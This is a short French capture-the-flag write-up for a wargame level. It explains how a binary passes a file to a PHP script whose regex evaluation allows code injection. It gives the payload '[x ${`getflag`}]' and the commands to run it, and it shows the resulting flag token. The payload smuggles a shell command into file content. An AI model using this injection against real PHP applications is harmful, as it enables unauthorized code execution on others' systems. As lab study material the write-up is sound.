Il y a deux fichier, un binaire et un script php.

Après décompilation le binaire nous indique qu'il éxécute le script php avec un execve sur le fichier passé en argument au binaire.

Le script PHP quand à lui récupére le contenu du fichier et modifie les lignes.

Donc avec la bonne syntaxe il est possible d'éxécuter un getflag : 

```bash
echo '[x ${`getflag`}]' > /tmp/flag06
```

```bash
./level06 /tmp/flag06
```

On obtient:
```bash
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
